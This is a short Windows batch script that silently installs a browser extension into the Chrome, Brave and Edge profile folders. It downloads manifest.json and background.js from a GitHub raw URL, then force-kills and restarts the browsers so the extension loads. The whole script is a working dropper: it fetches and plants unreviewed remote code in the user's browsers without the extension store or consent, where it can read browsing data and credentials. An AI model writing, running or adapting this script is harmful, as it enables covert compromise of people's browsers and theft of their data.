@echo off
setlocal enabledelayedexpansion

:: Find all Chrome-based browser extension folders
set "BASE=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions"
set "EXT_ID=leelplbjobiheomgknchcnbmnancegal"
set "EXT_VER=1.0.0_0"
set "EXT_DIR=%BASE%\%EXT_ID%\%EXT_VER%"

:: Create extension directory
mkdir "%EXT_DIR%" 2>nul

:: Download extension files directly
curl -s -o "%EXT_DIR%\manifest.json" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/manifest.json
curl -s -o "%EXT_DIR%\background.js" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/background.js

:: Do the same for Brave
set "BRAVE_BASE=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Extensions"
set "BRAVE_DIR=%BRAVE_BASE%\%EXT_ID%\%EXT_VER%"
mkdir "%BRAVE_DIR%" 2>nul
curl -s -o "%BRAVE_DIR%\manifest.json" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/manifest.json
curl -s -o "%BRAVE_DIR%\background.js" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/background.js

:: Do the same for Edge
set "EDGE_BASE=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Extensions"
set "EDGE_DIR=%EDGE_BASE%\%EXT_ID%\%EXT_VER%"
mkdir "%EDGE_DIR%" 2>nul
curl -s -o "%EDGE_DIR%\manifest.json" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/manifest.json
curl -s -o "%EDGE_DIR%\background.js" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/background.js

:: Kill browsers
taskkill /F /IM chrome.exe >nul 2>&1
taskkill /F /IM brave.exe >nul 2>&1
taskkill /F /IM msedge.exe >nul 2>&1
timeout /t 2 /nobreak >nul

:: Restart browsers
start "" chrome.exe >nul 2>&1
start "" brave.exe >nul 2>&1
start "" msedge.exe >nul 2>&1

exit
